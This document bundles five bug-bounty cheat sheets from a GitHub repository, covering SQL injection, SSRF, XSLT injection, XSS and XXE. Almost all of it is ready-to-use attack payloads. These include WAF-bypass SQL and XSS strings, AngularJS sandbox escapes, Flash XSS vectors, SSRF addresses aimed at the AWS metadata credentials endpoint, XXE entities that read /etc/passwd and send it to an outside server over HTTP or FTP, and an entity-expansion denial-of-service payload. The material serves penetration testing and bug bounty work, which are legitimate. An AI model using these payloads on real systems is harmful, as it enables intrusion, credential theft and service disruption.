{"source": "github", "repo": "EdOverflow/bugbounty-cheatsheet", "file": "cheatsheets/sqli.md", "url": "https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/sqli.md", "content": "## SQLI\n\n**Akamai Kona Bypass**\n\n* `MID` instead of `SUBSTRING`\n* `LIKE` instead of `=`\n* `/**/` instead of a `space`\n* `CURRENT_USER` instead of `CURRENT_USER()`\n* ` \"` instead of `'`\n\nFinal example: \n\n```sql\n444/**/OR/**/MID(CURRENT_USER,1,1)/**/LIKE/**/\"p\"/**/#\n```\n\n**Blogs**\n\n* http://pentestmonkey.net/blog/mssql-sql-injection-cheat-sheet/\n* http://isc.sans.edu/diary.html?storyid=9397\n* http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/\n* http://xd-blog.com.ar/descargas/manuales/bugs/full-mssql-injection-pwnage.html\n* http://securityoverride.com/articles.php?article_id=1&article=The_Complete_Guide_to_SQL_Injections\n* http://websec.wordpress.com/2010/03/19/exploiting-hard-filtered-sql-injections/\n* http://sqlzoo.net/hack/\n* http://www.sqlteam.com/article/sql-server-versions\n* http://www.krazl.com/blog/?p=3\n* http://www.owasp.org/index.php/Testing_for_MS_Access\n* http://web.archive.org/web/20101112061524/http://seclists.org/pen-test/2003/May/0074.html\n* http://web.archive.org/web/20080822123152/http://www.webapptest.org/ms-access-sql-injection-cheat-sheet-EN.html\n* http://www.youtube.com/watch?v=WkHkryIoLD0\n* http://layerone.info/archives/2009/Joe%20McCray%20-%20Advanced%20SQL%20Injection%20-%20L1%202009.pdf\n* http://vimeo.com/3418947\n* http://sla.ckers.org/forum/read.php?24,33903\n* http://websec.files.wordpress.com/2010/11/sqli2.pdf\n* http://old.justinshattuck.com/2007/01/18/mysql-injection-cheat-sheet/\n* http://ha.ckers.org/sqlinjection/\n* http://lab.mediaservice.net/notes_more.php?id=MSSQL\n", "timestamp": "2025-10-24T11:39:24.789285"}
{"source": "github", "repo": "EdOverflow/bugbounty-cheatsheet", "file": "cheatsheets/ssrf.md", "url": "https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/ssrf.md", "content": "## SSRF\n\n```\nhttp://0177.1/\n```\n\n```\nhttp://0x7f.1/\n```\n\n```\nhttp://127.000.000.1\n```\n\n```\nhttps://520968996\n```\n\n_Note:_ The latter can be calculated using http://www.subnetmask.info/\n\n**Exotic Handlers**\n\n```\ngopher://, dict://, php://, jar://, tftp://\n```\n\n**IPv6**\n\n```\nhttp://[::1]\n```\n\n```\nhttp://[::]\n```\n\n**Wildcard DNS**\n\n```\n10.0.0.1.xip.io\nwww.10.0.0.1.xip.io\nmysite.10.0.0.1.xip.io\nfoo.bar.10.0.0.1.xip.io\n```\n_Link:_ http://xip.io\n\n```\n10.0.0.1.nip.io\napp.10.0.0.1.nip.io\ncustomer1.app.10.0.0.1.nip.io\ncustomer2.app.10.0.0.1.nip.io\notherapp.10.0.0.1.nip.io\n```\n\n_Link:_ http://nip.io\n\n**AWS EC2 Metadata**\n\n```\nhttp://169.254.169.254/latest/meta-data/  \n```\n\n```\nhttp://169.254.169.254/latest/meta-data/local-hostname\n```\n\n```\nhttp://169.254.169.254/latest/meta-data/public-hostname\n```\n\n> If there is an IAM role associated with the instance, role-name is the name of the role, and role-name contains the temporary security credentials associated with the role [...]\n\n_Link:_ http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html (includes a comprehensive Instance Metadata Categories table)\n", "timestamp": "2025-10-24T11:39:24.901785"}
{"source": "github", "repo": "EdOverflow/bugbounty-cheatsheet", "file": "cheatsheets/xslt.md", "url": "https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xslt.md", "content": "## XSLT Injection\n\n**Backend infos**\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<html xsl:version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:php=\"http://php.net/xsl\">\n\t<body>\n\t\t<xsl:text>xsl:vendor = </xsl:text><xsl:value-of select=\"system-property('xsl:vendor')\"/><br/>\n\t\t<xsl:text>xsl:version = </xsl:text><xsl:value-of select=\"system-property('xsl:version')\"/><br/>\n\t</body>\n</html>\n```\n\n**Injecting in PHP**\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<html xsl:version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:php=\"http://php.net/xsl\">\n\t<body>\n\t\t<xsl:value-of name=\"bugbounty\" select=\"php:function('phpinfo')\"/>\n\t</body>\n</html>\n```\n\n", "timestamp": "2025-10-24T11:39:25.193965"}
{"source": "github", "repo": "EdOverflow/bugbounty-cheatsheet", "file": "cheatsheets/xss.md", "url": "https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xss.md", "content": "## XSS\n\n**Chrome XSS-Auditor Bypass** by [@vivekchsm](https://twitter.com/vivekchsm)\n\n```html\n<svg><animate xlink:href=#x attributeName=href values=&#106;avascript:alert(1) /><a id=x><rect width=100 height=100 /></a>\n```\n\n**Chrome < v60 beta XSS-Auditor Bypass**\n\n```html\n<script src=\"data:,alert(1)%250A-->\n```\n\n**Other Chrome XSS-Auditor Bypasses**\n\n```html\n<script>alert(1)</script\n```\n\n```html\n<script>alert(1)%0d%0a-->%09</script\n```\n\n```html\n<x>%00%00%00%00%00%00%00<script>alert(1)</script>\n```\n\n**Safari XSS Vector** by [@mramydnei](https://twitter.com/mramydnei/status/902470271327551489)\n\n```html\n<script>location.href;'javascript:alert%281%29'</script>\n```\n\n**XSS Polyglot** by [Ahmed Elsobky](https://github.com/0xSobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot)\n\n```\njaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\n```\n\n**Kona WAF (Akamai) Bypass**\n\n```html\n\\');confirm(1);//\n```\n\n**ModSecurity WAF Bypass**\nNote: This kind of depends on what security level the application is set to. See: https://modsecurity.org/rules.html\n```html\n<img src=x onerror=prompt(document.domain) onerror=prompt(document.domain) onerror=prompt(document.domain)>\n```\n\n**Wordfence XSS Bypasses**\n\n```html\n<meter onmouseover=\"alert(1)\"\n```\n\n```html\n'\">><div><meter onmouseover=\"alert(1)\"</div>\"\n```\n\n```html\n>><marquee loop=1 width=0 onfinish=alert(1)>\n```\n\n**Incapsula WAF Bypasses** by [@i_bo0om](https://twitter.com/i_bo0om)\n\n```html\n<iframe/onload='this[\"src\"]=\"javas&Tab;cript:al\"+\"ert``\"';>\n```\n\n```html\n<img/src=q onerror='new Function`al\\ert\\`1\\``'>\n```\n\n**jQuery < 3.0.0 XSS**\n by [Egor Homakov](https://github.com/jquery/jquery/issues/2432)\n\n```js\n$.get('http://sakurity.com/jqueryxss')\n```\n\nIn order to really exploit this jQuery XSS you will need to fulfil one of the following requirements:\n\n1) Find any cross domain requests to untrusted domains which may inadvertently execute script.\n2) Find any requests to trusted API endpoints where script can be injected into data sources.\n\n**URL verification bypasses (works without `&#x09;` too)**\n\n```\njavas&#x09;cript://www.google.com/%0Aalert(1)\n```\n\n**Markdown XSS**\n\n```md\n[a](javascript:confirm(1))\n```\n\n```md\n[a](javascript://www.google.com%0Aprompt(1))\n```\n\n```md\n[a](javascript://%0d%0aconfirm(1))\n```\n\n```md\n[a](javascript://%0d%0aconfirm(1);com)\n```\n\n```md\n[a](javascript:window.onerror=confirm;throw%201)\n```\n\n```md\n[a]: (javascript:prompt(1))\n```\n\n```md\n[a]:(\u0001javascript:alert(1))           //Add SOH Character\n```\n\n\n**Flash SWF XSS**\n\n- ZeroClipboard: `ZeroClipboard.swf?id=\\\"))}catch(e){confirm(/XSS./.source);}//&width=500&height=500&.swf`\n\n- plUpload Player: `plupload.flash.swf?%#target%g=alert&uid%g=XSS&`\n\n- plUpload MoxiePlayer: `Moxie.swf?target%g=confirm&uid%g=XSS` (also works with `Moxie.cdn.swf` and other variants)\n\n- FlashMediaElement: <code>flashmediaelement.swf?jsinitfunctio%gn=alert`1`</code>\n\n- videoJS: `video-js.swf?readyFunction=confirm` and `video-js.swf?readyFunction=alert%28document.domain%2b'%20XSS'%29`\n\n- YUI \"io.swf\": `io.swf?yid=\\\"));}catch(e){alert(document.domain);}//`\n\n- YUI \"uploader.swf\": `uploader.swf?allowedDomain=\\%22}%29%29%29}catch%28e%29{alert%28document.domain%29;}//<`\n\n- Open Flash Chart: `open-flash-chart.swf?get-data=(function(){alert(1)})()`\n\n- AutoDemo: `control.swf?onend=javascript:alert(1)//`\n\n- Adobe FLV Progressive: `/main.swf?baseurl=asfunction:getURL,javascript:alert(1)//` and `/FLVPlayer_Progressive.swf?skinName=asfunction:getURL,javascript:alert(1)//`\n\n- Banner.swf (generic): `banner.swf?clickTAG=javascript:alert(document.domain);//`\n\n- JWPlayer (legacy): `player.swf?playerready=alert(document.domain)` and `/player.swf?tracecall=alert(document.domain)`\n\n- SWFUpload 2.2.0.1: `swfupload.swf?movieName=\"]);}catch(e){}if(!self.a)self.a=!confirm(1);//`\n\n- Uploadify (legacy): `uploadify.swf?movieName=%22])}catch(e){if(!window.x){window.x=1;confirm(%27XSS%27)}}//&.swf`\n\n- FlowPlayer 3.2.7: `flowplayer-3.2.7.swf?config={\"clip\":{\"url\":\"http://edge.flowplayer.org/bauhaus.mp4\",\"linkUrl\":\"JavaScriPt:confirm(document.domain)\"}}&.swf`\n\n_Note: Useful reference on constructing Flash-based XSS payloads available at [MWR Labs](https://labs.mwrinfosecurity.com/blog/popping-alert1-in-flash/)._\n\n**Lightweight Markup Languages**\n\n**RubyDoc** (.rdoc)\n\n```rdoc\nXSS[JavaScript:alert(1)]\n```\n\n**Textile** ([.textile](https://txstyle.org/))\n\n```textile\n\"Test link\":javascript:alert(1)\n```\n\n**reStructuredText** ([.rst](http://docutils.sourceforge.net/docs/user/rst/quickref.html))\n\n```rst\n`Test link`__.\n\n__ javascript:alert(document.domain)  \n```\n\n**Unicode characters**\n\n```html\n‚Ä†‚Ä°‚Ä¢Ôºúimg src=a onerror=javascript:alert('test')>‚Ä¶‚Ä∞‚Ç¨\n```\n\n**AngularJS Template Injection based XSS**\n\n*For manual verification on a live target, use `angular.version` in your browser console*\n\n**1.0.1 - 1.1.5** by [Mario Heiderich (Cure53)](https://twitter.com/0x6D6172696F)\n\n```js\n{{constructor.constructor('alert(1)')()}}\n```\n\n**1.2.0 - 1.2.1** by [Jan Horn (Google)](https://twitter.com/tehjh)\n\n```js\n{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}\n```\n\n**1.2.2 - 1.2.5** by [Gareth Heyes (PortSwigger)](https://twitter.com/garethheyes)\n\n```js\n{{'a'[{toString:[].join,length:1,0:'__proto__'}].charAt=''.valueOf;$eval(\"x='\"+(y='if(!window\\\\u002ex)alert(window\\\\u002ex=1)')+eval(y)+\"'\");}}\n```\n\n**1.2.6 - 1.2.18** by [Jan Horn (Google)](https://twitter.com/tehjh)\n\n```js\n{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}\n```\n\n**1.2.19 - 1.2.23** by [Mathias Karlsson](https://twitter.com/avlidienbrunn)\n\n```js\n{{toString.constructor.prototype.toString=toString.constructor.prototype.call;[\"a\",\"alert(1)\"].sort(toString.constructor);}}\n```\n\n**1.2.24 - 1.2.29** by [Gareth Heyes (PortSwigger)](https://twitter.com/garethheyes)\n\n```js\n{{'a'.constructor.prototype.charAt=''.valueOf;$eval(\"x='\\\"+(y='if(!window\\\\u002ex)alert(window\\\\u002ex=1)')+eval(y)+\\\"'\");}}\n```\n\n**1.3.0** by [G√°bor Moln√°r (Google)](https://twitter.com/molnar_g)\n\n```\n{{!ready && (ready = true) && (\n      !call\n      ? $$watchers[0].get(toString.constructor.prototype)\n      : (a = apply) &&\n        (apply = constructor) &&\n        (valueOf = call) &&\n        (''+''.toString(\n          'F = Function.prototype;' +\n          'F.apply = F.a;' +\n          'delete F.a;' +\n          'delete F.valueOf;' +\n          'alert(1);'\n        ))\n    );}}\n```\n\n**1.3.1 - 1.3.2** by [Gareth Heyes (PortSwigger)](https://twitter.com/garethheyes)\n\n```js\n{{\n    {}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;\n    'a'.constructor.prototype.charAt=''.valueOf; \n    $eval('x=alert(1)//'); \n}}\n```\n\n**1.3.3 - 1.3.18** by [Gareth Heyes (PortSwigger)](https://twitter.com/garethheyes)\n\n```js\n{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join; \n\n  'a'.constructor.prototype.charAt=[].join;\n  $eval('x=alert(1)//');  }}\n```\n\n**1.3.19** by [Gareth Heyes (PortSwigger)](https://twitter.com/garethheyes)\n\n```js\n{{\n    'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join; \n    $eval('x=alert(1)//'); \n}}\n\n```\n\n**1.3.20** by [Gareth Heyes (PortSwigger)](https://twitter.com/garethheyes)\n\n```js\n{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}\n```\n\n**1.4.0 - 1.4.9** by [Gareth Heyes (PortSwigger)](https://twitter.com/garethheyes)\n\n```js\n{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}\n```\n\n**1.5.0 - 1.5.8** by [Ian Hickey](https://twitter.com/ianhickey1024)\n\n```js\n{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}\n```\n\n**1.5.9 - 1.5.11** by [Jan Horn (Google)](https://twitter.com/tehjh)\n\n```js\n{{\n    c=''.sub.call;b=''.sub.bind;a=''.sub.apply;\n    c.$apply=$apply;c.$eval=b;op=$root.$$phase;\n    $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;\n    C=c.$apply(c);$root.$$phase=op;$root.$digest=od;\n    B=C(b,c,b);$evalAsync(\"\n    astNode=pop();astNode.type='UnaryExpression';\n    astNode.operator='(window.X?void0:(window.X=true,alert(1)))+';\n    astNode.argument={type:'Identifier',name:'foo'};\n    \");\n    m1=B($$asyncQueue.pop().expression,null,$root);\n    m2=B(C,null,m1);[].push.apply=m2;a=''.sub;\n    $eval('a(b.c)');[].push.apply=a;\n}}\n```\n\n**1.6.0+** (no [Expression Sandbox](http://angularjs.blogspot.co.uk/2016/09/angular-16-expression-sandbox-removal.html)) by [Mario Heiderich (Cure53)](https://twitter.com/0x6D6172696F)\n\n```js\n{{constructor.constructor('alert(1)')()}}\n```\n\n**Content Security Policy (CSP) bypass via JSONP endpoints**\n\nGrab the target's CSP:\n\n```\ncurl -I http://example.com | grep 'Content-Security-Policy'\n```\n\nEither paste the CSP into https://csp-evaluator.withgoogle.com/ or just submit the target's address into the \"Content Security Policy\" field. The CSP Evaluator will notify you if one of the whitelisted domains has JSONP endpoints.\n\n![image](https://user-images.githubusercontent.com/18099289/32136707-a1c12510-bc12-11e7-8a80-8a22b3e94232.png)\n\nNow we can use a Google dork to find some JSONP endpoints on the domains listed above.\n\n```\nsite:example.com inurl:callback\n```\n", "timestamp": "2025-10-24T11:39:25.264896"}
{"source": "github", "repo": "EdOverflow/bugbounty-cheatsheet", "file": "cheatsheets/xxe.md", "url": "https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xxe.md", "content": "**LFI Test**\n\n```\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [  \n<!ELEMENT foo (#ANY)>\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>\n```\n\n**Blind LFI test (when first case doesn't return anything)**\n\n```\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n<!ELEMENT foo (#ANY)>\n<!ENTITY % xxe SYSTEM \"file:///etc/passwd\">\n<!ENTITY blind SYSTEM \"https://www.example.com/?%xxe;\">]><foo>&blind;</foo>\n```\n\n**Access Control bypass (loading restricted resources - PHP example)**\n\n```\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n<!ENTITY ac SYSTEM \"php://filter/read=convert.base64-encode/resource=http://example.com/viewlog.php\">]>\n<foo><result>&ac;</result></foo>\n```\n\n**SSRF Test**\n\n```\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [  \n<!ELEMENT foo (#ANY)>\n<!ENTITY xxe SYSTEM \"https://www.example.com/text.txt\">]><foo>&xxe;</foo>\n```\n\n**XEE (XML Entity Expansion - DOS)**\n\n```\n<?xml version=\"1.0\"?>\n<!DOCTYPE lolz [\n<!ENTITY lol \"lol\">\n<!ELEMENT lolz (#PCDATA)>\n<!ENTITY lol1 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\n<!ENTITY lol2 \"&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;\">\n<!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">\n<!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\">\n<!ENTITY lol5 \"&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;\">\n<!ENTITY lol6 \"&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;\">\n<!ENTITY lol7 \"&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;\">\n<!ENTITY lol8 \"&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;\">\n<!ENTITY lol9 \"&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;\">\n]>\n<lolz>&lol9;</lolz>\n```\n\n**XEE #2 (Remote attack - through external xml inclusion)**\n\n```\n<?xml version=\"1.0\"?>\n<!DOCTYPE lolz [\n<!ENTITY test SYSTEM \"https://example.com/entity1.xml\">]>\n<lolz><lol>3..2..1...&test<lol></lolz>\n```\n\n**XXE FTP HTTP Server**\n\nhttps://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb\n\nhttp://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html\n```\n<!DOCTYPE data [\n<!ENTITY % remote SYSTEM \"http://publicServer.com/parameterEntity_sendftp.dtd\">\n%remote;\n%send;\n]>\n<data>4</data>\n\nFile stored on http://publicServer.com/parameterEntity_sendftp.dtd\n\n<!ENTITY % param1 \"<!ENTITY &#37; send SYSTEM 'ftp://publicServer.com/%payload;'>\">\n%param1;\n```\n\n**XXE UTF-7**\n\n```\n<?xml version=\"1.0\" encoding=\"UTF-7\"?>\n+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4\n+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+\n+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4\n```\nTo convert between UTF-8 & UTF-7 use recode.\n`recode UTF8..UTF7 payload-file.xml`\n", "timestamp": "2025-10-24T11:39:25.479318"}
